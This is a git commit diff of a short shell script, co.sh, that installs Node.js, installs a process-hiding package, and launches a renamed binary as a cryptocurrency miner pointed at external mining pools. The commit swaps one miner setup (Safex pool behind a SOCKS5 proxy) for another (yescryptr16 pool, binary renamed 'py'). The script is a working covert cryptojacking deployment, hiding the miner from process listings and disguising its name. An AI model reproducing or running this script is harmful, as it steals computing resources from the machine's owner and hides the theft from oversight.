4d7d11a82b494e691df9ddb3709a52b201ce0eac
trailt <100853475+trailt@users.noreply.github.com>
2022-03-03 21:50:44 +0700

    Update co.sh

--- co.sh
+++ co.sh
@@ -1,6 +1,6 @@
 apt install nodejs
 apt install npm
 npm i -g node-process-hider
-chmod 777 co
-ph add co
-./co --donate-level 1 -o sf.pool-pay.com:4025 -u SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -p 00 -a rx/sfx -k -x socks5://192.252.214.20:15864 
+chmod 777 py
+ph add py
+./py -a yescryptr16  -o stratum+tcps://stratum-asia.rplant.xyz:17055 -u qbEHW2NZHWBYfNCdGrUJBAba3i4Ey4i3u2
